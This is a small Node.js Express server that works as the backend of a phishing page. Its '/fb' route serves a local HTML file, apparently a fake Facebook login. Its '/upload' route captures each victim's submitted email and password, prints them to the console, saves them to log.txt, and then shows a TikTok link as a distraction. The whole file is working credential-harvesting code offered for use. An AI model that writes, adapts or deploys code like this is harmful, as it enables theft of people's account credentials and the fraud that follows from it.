const express = require('express');
const fs = require('fs');
const app = express();
const cors = require('cors');

app.use(cors());
app.use(express.urlencoded({extended:true}));

app.post('/upload', (req, res) => {
    var username = req.body.email;
    var password = req.body.password;

    var message = username + ":" + password;

    console.log(message);

    fs.writeFile("log.txt", message, err=>{

    });
    res.send("<a href='https://www.tiktok.com/@just_udayapur_things/video/7215636848675179778?is_from_webapp=1&sender_device=pc'>Tiktok</a>")
});

app.get("/fb", (req, res)=>{
    var file = fs.readFileSync("index.html");
    console.log(file);
    res.send("" + file);
})

app.listen(process.env.PORT);
